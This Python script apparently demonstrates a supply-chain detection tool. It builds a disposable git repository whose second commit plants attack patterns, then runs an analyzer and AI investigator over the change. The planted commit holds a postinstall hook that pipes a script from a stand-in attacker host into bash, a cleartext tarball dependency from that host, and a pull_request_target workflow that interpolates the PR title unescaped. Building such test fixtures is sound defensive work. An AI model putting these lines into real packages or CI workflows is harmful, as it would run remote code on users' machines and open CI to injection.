"""
Controlled Non-CVE Supply Chain Attack Demonstration Script
Executes ChangeAnalyzer and SuspiciousChangeAgent against a controlled synthetic repository.
Demonstrates multi-vector detection, correlation, and LangGraph AI agent investigation
without any reliance on published CVEs.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

# Ensure root and src on sys.path
_ROOT = Path(__file__).resolve().parent.parent
_SRC = _ROOT / "src"
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

# Load .env if present
try:
    from dotenv import load_dotenv
    load_dotenv(_ROOT / ".env")
except ImportError:
    pass

from change_analyzer import ChangeAnalyzer, generate_markdown_report

SAFE_ENV = {
    k: v for k, v in os.environ.items()
    if not any(s in k.upper() for s in ("KEY", "TOKEN", "SECRET", "PASSWORD", "AUTH"))
}


def _git(args: list[str], cwd: Path, capture_output: bool = False, text: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(
        args,
        cwd=cwd,
        capture_output=capture_output,
        text=text,
        env=SAFE_ENV,
        shell=False,
    )


def build_synthetic_repo(target_dir: Path) -> tuple[str, str]:
    """Create controlled multi-vector non-CVE attack scenario repository."""
    _git(["git", "init"], cwd=target_dir, capture_output=True)
    _git(["git", "config", "user.name", "Security Auditor"], cwd=target_dir)
    _git(["git", "config", "user.email", "auditor@example.com"], cwd=target_dir)

    # Base commit: clean baseline
    base_pkg = {
        "name": "enterprise-web-service",
        "version": "1.0.0",
        "description": "Enterprise microservice baseline",
        "dependencies": {
            "express": "^4.18.2",
            "lodash": "^4.17.21"
        },
        "scripts": {
            "start": "node index.js",
            "test": "jest"
        }
    }
    (target_dir / "package.json").write_text(json.dumps(base_pkg, indent=2), encoding="utf-8")

    wf_dir = target_dir / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    clean_wf = (
        "name: CI\n"
        "on: [push]\n"
        "permissions:\n"
        "  contents: read\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1\n"
        "      - run: npm test\n"
    )
    (wf_dir / "ci.yml").write_text(clean_wf, encoding="utf-8")

    _git(["git", "add", "."], cwd=target_dir)
    _git(["git", "commit", "-m", "Baseline initial clean commit"], cwd=target_dir)
    base_sha = _git(["git", "rev-parse", "HEAD"], cwd=target_dir, capture_output=True, text=True).stdout.strip()

    # Head commit: coordinated multi-vector non-CVE attack
    # Vector 1: cleartext HTTP unpinned tarball dependency
    # Vector 2: remote download piped to shell in postinstall lifecycle script
    attack_pkg = {
        "name": "enterprise-web-service",
        "version": "1.0.1",
        "description": "Enterprise microservice baseline with telemetry",
        "dependencies": {
            "express": "^4.18.2",
            "lodash": "^4.17.21",
            "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"
        },
        "scripts": {
            "start": "node index.js",
            "test": "jest",
            "postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"
        }
    }
    (target_dir / "package.json").write_text(json.dumps(attack_pkg, indent=2), encoding="utf-8")

    # Vector 3: CI/CD workflow weakness: unpinned 3rd-party action & pull_request_target injection
    attack_wf = (
        "name: CI\n"
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  test:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11\n"
        "      - uses: third-party-untrusted/metrics-action@v1\n"
        "      - run: echo \"PR Title is: ${{ github.event.pull_request.title }}\"\n"
    )
    (wf_dir / "ci.yml").write_text(attack_wf, encoding="utf-8")

    _git(["git", "add", "."], cwd=target_dir)
    _git(["git", "commit", "-m", "Add core-metrics-collector and telemetry CI/CD workflow"], cwd=target_dir)
    head_sha = _git(["git", "rev-parse", "HEAD"], cwd=target_dir, capture_output=True, text=True).stdout.strip()

    return base_sha, head_sha


def main():
    print("=" * 80)
    print("  SOFTWARE SUPPLY CHAIN GUARDIAN - PERSON 2")
    print("  CONTROLLED NON-CVE ATTACK SCENARIO DEMONSTRATION")
    print("=" * 80)

    with tempfile.TemporaryDirectory() as tmp_dir:
        repo_dir = Path(tmp_dir) / "synthetic-supply-chain-repo"
        repo_dir.mkdir(parents=True)

        print("\n[1] Constructing disposable synthetic repository with multi-vector non-CVE changes...")
        base_sha, head_sha = build_synthetic_repo(repo_dir)
        print(f"    Base commit (Clean): {base_sha[:10]}")
        print(f"    Head commit (Attack Vector): {head_sha[:10]}")

        print("\n[2] Executing ChangeAnalyzer with LangGraph AI Investigator...")
        analyzer = ChangeAnalyzer(
            repo_dir=repo_dir,
            base_commit=base_sha,
            head_commit=head_sha,
            enable_ai=True
        )
        report = analyzer.run_investigation()

        print("\n[3] Analysis Summary:")
        metrics = report.get("metrics", {})
        print(f"    Total Findings Detected: {metrics.get('total_findings', 0)}")
        print(f"    Severity Breakdown: {metrics.get('severity_counts', {})}")
        print(f"    Category Breakdown: {metrics.get('category_counts', {})}")

        print(f"\n[4] Cross-Signal Correlated Composite Scenarios:")
        composites = report.get("correlated_scenarios", [])
        print(f"    Total Composite Scenarios: {len(composites)}")
        for i, c in enumerate(composites, 1):
            print(f"    --- Scenario {i}: {c.get('scenario_name')} ---")
            print(f"    Composite ID: {c.get('composite_id')}")
            print(f"    Scenario Type: {c.get('scenario_type')}")
            print(f"    Severity: {c.get('severity')} | Confidence: {c.get('correlation_confidence')}")
            print(f"    MITRE ATT&CK: {c.get('attack_technique')}")
            print(f"    Suspected Scenario: {c.get('suspected_scenario')}")
            print(f"    Primary Finding IDs: {c.get('primary_finding_ids')}")

        print(f"\n[5] LangGraph AI Agent Investigations:")
        ai_invs = report.get("ai_investigations", [])
        print(f"    Total Investigations Executed: {len(ai_invs)}")
        for inv in ai_invs:
            print(f"\n    [*] Finding ID: {inv.get('finding_id')}")
            print(f"        Affected File: {inv.get('affected_file')}:{inv.get('line_number')}")
            print(f"        Verdict: {inv.get('verdict')} (Confidence: {inv.get('confidence')})")
            print(f"        Planner: {inv.get('planner')} (Model: {inv.get('model')})")
            print(f"        Rationale: {inv.get('rationale')}")
            if inv.get("attack_scenario"):
                print(f"        Attack Scenario: {inv.get('attack_scenario')}")
            print(f"        Supporting Evidence Count: {len(inv.get('supporting_evidence', []))}")
            print(f"        Investigation Steps Trace: {[s.get('tool') for s in inv.get('investigation_steps', [])]}")

        # Save artifacts
        out_json = _ROOT / "artifacts" / "reports" / "NON_CVE_DEMONSTRATION.json"
        out_json.parent.mkdir(parents=True, exist_ok=True)
        out_json.write_text(json.dumps(report, indent=2), encoding="utf-8")
        print(f"\n[+] Demonstration JSON written to: {out_json.resolve()}")

        out_md = _ROOT / "artifacts" / "reports" / "NON_CVE_DEMONSTRATION.md"
        generate_markdown_report(report, out_md)
        print(f"[+] Demonstration Markdown report written to: {out_md.resolve()}")


if __name__ == "__main__":
    main()
